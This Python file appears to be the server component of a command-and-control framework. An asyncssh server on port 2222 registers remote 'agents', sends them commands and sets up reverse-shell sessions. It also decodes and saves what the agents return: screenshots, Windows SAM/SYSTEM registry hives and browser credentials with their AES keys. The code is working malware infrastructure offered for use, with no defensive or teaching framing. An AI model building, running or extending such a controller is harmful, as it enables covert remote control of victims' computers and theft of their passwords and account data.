import asyncssh, asyncio, os, httpx, base64, time, json # type: ignore

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SERVER_KEY_PATH = os.path.join(BASE_DIR, '..', '..', 'keys', 'server_key')
AUTHORIZED_KEYS_PATH = os.path.join(BASE_DIR, 'authorized_keys')
SCREENSHOTS_DIR = os.path.abspath(os.path.join(BASE_DIR, '..', '..', 'screenshots'))
CREDS_DIR = os.path.abspath(os.path.join(BASE_DIR, '..', '..', 'creds'))
CREDS_NAVIGATOR_DIR = os.path.join(CREDS_DIR, 'navigator')

os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
os.makedirs(CREDS_DIR, exist_ok=True)
os.makedirs(CREDS_NAVIGATOR_DIR, exist_ok=True)

API_URL = "http://localhost:8000"

active_clients = {}

async def api_post(endpoint, data):
    """Asynchronous API request to avoid blocking the event loop."""
    url = f"{API_URL}{endpoint}" if API_URL.startswith("http") else f"http://127.0.0.1:8000{endpoint}"
    
    async with httpx.AsyncClient() as client:
        try:
            await client.post(url, json=data, timeout=5.0)
        except Exception as e:
            print(f"[!] API Error ({endpoint}): {e}")

async def api_update_pending_log(ip, instruction, result):
    """Asynchronous update of a pending command."""
    url = f"{API_URL}/clients/{ip}/logs/update_pending" if API_URL.startswith("http") else f"http://127.0.0.1:8000/clients/{ip}/logs/update_pending"
    
    async with httpx.AsyncClient() as client:
        try:
            resp = await client.post(url, json={
                'instruction': instruction,
                'result': result
            }, timeout=5.0)
            return resp.status_code == 200
        except Exception as e:
            print(f"[!] API update_pending Error: {e}")
            return False


def save_screenshot(client_ip: str, result: str) -> str:
    """
    Decodes and saves a base64 screenshot.
    Expected format: SUCCESS|dimensions|extension|base64data
    Returns the saved file path or an error message.
    """
    try:
        parts = result.split('|', 3)
        if len(parts) != 4 or parts[0] != 'SUCCESS':
            return result
        
        _, dimensions, ext, b64_data = parts
        
        image_data = base64.b64decode(b64_data)
        
        timestamp = int(time.time())
        safe_ip = client_ip.replace('.', '_')
        filename = f"screenshot_{safe_ip}_{timestamp}.{ext}"
        filepath = os.path.join(SCREENSHOTS_DIR, filename)
        
        with open(filepath, 'wb') as f:
            f.write(image_data)
        
        print(f"[+] Screenshot saved: {filepath} ({dimensions})")
        return f"SUCCESS: Screenshot saved to {filepath} ({dimensions})"
        
    except Exception as e:
        print(f"[!] Error saving screenshot: {e}")
        return f"Error saving screenshot: {str(e)}"


def save_creds_hives(client_ip: str, result: str) -> str:
    """
    Decodes and saves base64 SAM/SYSTEM hives.
    Expected format: SUCCESS||SYSTEM|hive|base64_system||SAM|hive|base64_sam
    """
    try:
        if not result.startswith('SUCCESS||'):
            return result
        parts = result.split('||')
        if len(parts) < 2:
            return result
        timestamp = int(time.time())
        safe_ip = client_ip.replace('.', '_')
        saved = []
        for block in parts[1:]:
            if not block.strip():
                continue
            tok = block.split('|', 2)
            if len(tok) != 3:
                continue
            name, ext, b64_data = tok
            data = base64.b64decode(b64_data)
            filename = f"{name}_{safe_ip}_{timestamp}.{ext}"
            filepath = os.path.join(CREDS_DIR, filename)
            with open(filepath, 'wb') as f:
                f.write(data)
            saved.append(filepath)
            print(f"[+] Hive saved: {filepath}")
        if not saved:
            return "Error: No hive data parsed."
        return f"SUCCESS: Hives saved to creds/ ({len(saved)} files)"
    except Exception as e:
        print(f"[!] Error saving creds hives: {e}")
        return f"Error saving creds hives: {str(e)}"


def save_creds_navigator(client_ip: str, result: str) -> str:
    """
    Decodes and saves base64 navigator credentials.
    Expected format: SUCCESS|base64_json or SUCCESS|message
    """
    try:
        if not result.startswith('SUCCESS|'):
            return result
        
        parts = result.split('|', 1)
        if len(parts) != 2:
            return result
        
        data_part = parts[1]
        
        if not data_part or data_part.startswith('Aucun') or 'Error' in data_part:
            return result
        
        try:
            json_data = base64.b64decode(data_part).decode('utf-8')
            data = json.loads(json_data)
        except Exception as e:
            print(f"[!] Error decoding navigator credentials: {e}")
            return f"Error: Failed to decode navigator credentials - {str(e)}"
        
        if isinstance(data, dict):
            credentials = data.get('credentials', [])
            debug_messages = data.get('debug', [])
            timestamp = data.get('timestamp', int(time.time()))
            aes_keys = data.get('aes_keys', {})
        else:
            credentials = data if isinstance(data, list) else []
            debug_messages = []
            timestamp = int(time.time())
            aes_keys = {}
        
        if debug_messages:
            print(f"\n[DEBUG] Debug messages for {client_ip}:")
            for msg in debug_messages:
                print(f"  [DEBUG] {msg}")
        
        if not credentials:
            return result
        
        safe_ip = client_ip.replace('.', '_')
        filename = f"navigator_{safe_ip}_{timestamp}.json"
        filepath = os.path.join(CREDS_NAVIGATOR_DIR, filename)
        
        save_data = {
            'device_ip': client_ip,
            'timestamp': timestamp,
            'count': len(credentials),
            'credentials': credentials,
            'debug': debug_messages
        }
        
        if aes_keys:
            save_data['aes_keys'] = aes_keys
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(save_data, f, indent=2, ensure_ascii=False)
        
        print(f"[+] Navigator credentials saved: {filepath} ({len(credentials)} credentials)")
        return f"SUCCESS: Navigator credentials saved to creds/navigator/ ({len(credentials)} credentials)"
        
    except Exception as e:
        print(f"[!] Error saving creds navigator: {e}")
        return f"Error saving navigator credentials: {str(e)}"


class C2Session(asyncssh.SSHServerSession):
    def __init__(self, client_ip):
        self.client_ip = client_ip
        self._chan = None
        self.last_command = None
        self._buffer = ""

    def connection_made(self, chan):
        self._chan = chan
        is_reconnection = self.client_ip not in active_clients
        active_clients[self.client_ip] = self
        timestamp = os.popen('date "+%Y-%m-%d %H:%M:%S"').read().strip()
        asyncio.create_task(api_post('/clients/register', {
            'ip': self.client_ip,
            'last_seen': timestamp,
            'is_reconnection': True
        }))
        asyncio.create_task(api_post(f'/clients/{self.client_ip}/logs/add', {
            'log': {
                "type": "system",
                "content": f"[CONNECTED] Agent connected to C2 server",
                "timestamp": timestamp
            }
        }))
        print(f"[+] Client {self.client_ip} connected and registered.")

    def connection_lost(self, exc):
        if self.client_ip in active_clients:
            del active_clients[self.client_ip]
            timestamp = os.popen('date "+%Y-%m-%d %H:%M:%S"').read().strip()
            asyncio.create_task(api_post(f'/clients/{self.client_ip}/logs/add', {
                'log': {
                    "type": "system",
                    "content": f"[DISCONNECTED] Agent disconnected from C2 server",
                    "timestamp": timestamp
                }
            }))
            asyncio.create_task(api_post('/clients/register', {
                'ip': self.client_ip,
                'last_seen': timestamp,
                'is_reconnection': False
            }))
            print(f"[!] Client {self.client_ip} disconnected.")

    def data_received(self, data, datatype):
        if isinstance(data, bytes):
            data = data.decode('utf-8', errors='replace')
        
        self._buffer += data
        
        while '\n' in self._buffer:
            line, self._buffer = self._buffer.split('\n', 1)
            clean_data = line.strip()
            
            if not clean_data:
                continue
            
            preview = clean_data[:100] + '...' if len(clean_data) > 100 else clean_data
            print(f"[SSH] Full message received ({len(clean_data)} chars): {preview}", flush=True)
            
            command_part = None
            result_part = None
            if '---' in clean_data:
                command_part, result_part = [part.strip() for part in clean_data.split('---', 1)]
                print(f"[SSH] Command: {command_part}", flush=True)
                print(f"[SSH] Result: {len(result_part) if result_part else 0} chars", flush=True)

            asyncio.create_task(self._handle_data_received(clean_data, command_part, result_part))

    async def _handle_data_received(self, clean_data, command_part, result_part):
        handled = False
        display_result = result_part
        
        if command_part and 'CREDS' in (command_part or '').upper():
            if result_part and result_part.startswith('SUCCESS||'):
                display_result = save_creds_hives(self.client_ip, result_part)
            elif result_part and result_part.startswith('SUCCESS|') and 'navigator' in (command_part or '').lower():
                display_result = save_creds_navigator(self.client_ip, result_part)
        elif command_part and command_part.upper() == 'SCREENSHOT' and result_part and result_part.startswith('SUCCESS|'):
            display_result = save_screenshot(self.client_ip, result_part)
        
        if command_part:
            handled = await api_update_pending_log(self.client_ip, command_part, display_result or '')

        if not handled and self.last_command:
            handled = await api_update_pending_log(self.client_ip, self.last_command, display_result or clean_data)

        if not handled:
            await api_post(f'/clients/{self.client_ip}/logs/add', {
                'log': {
                    "type": "output",
                    "content": display_result or clean_data,
                    "timestamp": os.popen('date "+%Y-%m-%d %H:%M:%S"').read().strip()
                }
            })

        preview = (display_result or clean_data)[:50] + ('...' if len(display_result or clean_data) > 50 else '')
        print(f"\n[Response from {self.client_ip}]: {preview}")
        print(f"C2 (client {self.client_ip})> ", end='', flush=True)

    def exec_requested(self, command):
        print(f"Exec requested from client {self.client_ip}: {command}")
        asyncio.create_task(self.handle_cli())
        return True

    def handle_reverse_shell_instruction(self, instruction):
        """Executed if a REVERSE_SHELL instruction is launched."""
        try:
            parts = instruction.split()
            port = parts[1] if len(parts) > 1 else "4444"
            print(f"\n[!] REVERSE SHELL prepared for port {port}. The web terminal will open after client confirmation.", flush=True)
            
        except Exception as e:
            print(f"[!] Error in handle_reverse_shell_instruction: {e}")

    async def process_command(self, cmd):
        """Processes a command (from CLI or API)."""
        clean_cmd = cmd.strip()
        if not clean_cmd:
            return

        if clean_cmd.upper().startswith("SHELL"):
            self.handle_reverse_shell_instruction(clean_cmd)

        self.last_command = clean_cmd
        if self._chan:
            self._chan.write(clean_cmd + '\n')

    async def handle_cli(self):
        print(f"\n[!] Client {self.client_ip} connected. Waiting for API commands...")
        try:
            while not self._chan.is_closing():
                await asyncio.sleep(1)
        except Exception as e:
            print(f"Error handling session for client {self.client_ip}: {e}")
        finally:
            print(f"Closing session for client {self.client_ip}.")
            self._chan.close()

class C2Server(asyncssh.SSHServer):
    def connection_made(self, conn):
        self._conn = conn
        self.client_ip = conn.get_extra_info('peername')[0]
        print(f"Connection from {self.client_ip}")

    def begin_auth(self, username):
        return False

    def session_requested(self):
        return C2Session(self.client_ip)

async def start_ssh_server():
    print("SSH Server starting on port 2222...")
    
    if not os.path.exists(SERVER_KEY_PATH):
        print(f"[+] Generating new server key at {SERVER_KEY_PATH}")
        try:
            os.makedirs(os.path.dirname(SERVER_KEY_PATH), exist_ok=True)
            key = asyncssh.generate_private_key('ssh-rsa')
            with open(SERVER_KEY_PATH, 'w') as f:
                f.write(key.export_private_key().decode())
            os.chmod(SERVER_KEY_PATH, 0o600)
        except Exception as e:
            print(f"[!] Error generating key: {e}")

    print("Starting SSH server on 0.0.0.0:2222...")
    
    if os.path.exists(SERVER_KEY_PATH):
        print(f"[DEBUG] Server key found: {SERVER_KEY_PATH}")
    else:
        print(f"[DEBUG] Server key NOT found, generating...")

    await asyncssh.create_server(
        C2Server,
        host='0.0.0.0',
        port=2222,
        server_host_keys=[SERVER_KEY_PATH],
        authorized_client_keys=AUTHORIZED_KEYS_PATH
    )
    print("SSH Server started and listening on 0.0.0.0:2222")
    await asyncio.Event().wait()
